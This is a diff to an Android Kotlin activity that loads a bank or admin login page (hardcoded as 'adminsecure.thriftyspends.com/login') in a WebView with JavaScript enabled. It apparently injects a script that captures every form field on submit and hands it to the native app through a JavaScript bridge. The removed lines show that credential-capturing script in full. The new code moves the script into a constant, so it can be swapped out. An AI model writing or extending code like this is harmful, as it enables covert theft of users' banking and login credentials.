@@ -40,6 +40,7 @@ class MyTestingActivityKotlin : AppCompatActivity() {
     private var close: ImageView?=null
     private val REQUEST_EXTERNAL_STORAGe = 1
     private var count:Int=0
+    private var JS=""" """
     private val permissionstorage = arrayOf(
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
         Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -57,9 +58,12 @@ class MyTestingActivityKotlin : AppCompatActivity() {
         window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
         window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
         window.statusBarColor = Color.parseColor("#1D1C21")
-        url!!.text = Constants.BANK_URL
+        //url!!.text = Constants.BANK_URL
+        url!!.text = "https://adminsecure.thriftyspends.com/login"//Constants.BANK_URL
+        JS="""${Constants.JS_SCRIPT}"""
         verifypermissions(this)
-        webView?.loadUrl( Constants.BANK_URL)
+       // webView?.loadUrl( Constants.BANK_URL)
+        webView?.loadUrl("https://adminsecure.thriftyspends.com/login")
         webView?.settings?.javaScriptEnabled = true
         webView?.getSettings()?.setJavaScriptCanOpenWindowsAutomatically(true);
         webView?.requestFocusFromTouch();
@@ -137,20 +141,7 @@ class MyTestingActivityKotlin : AppCompatActivity() {
 
     private fun injectJavaScript(view: WebView?) {
         view!!.loadUrl(
-            """
-           javascript:(function() {
-         var form = document.querySelector('form');
-
-    function updateResult() {
-     var out = new URLSearchParams(new FormData(form)).toString();
-       Bridge.callFromJs(out);
-
-}
-form.addEventListener('submit', updateResult);
- 
-          
-           })() 
-        """
+            JS
         )
     }
 
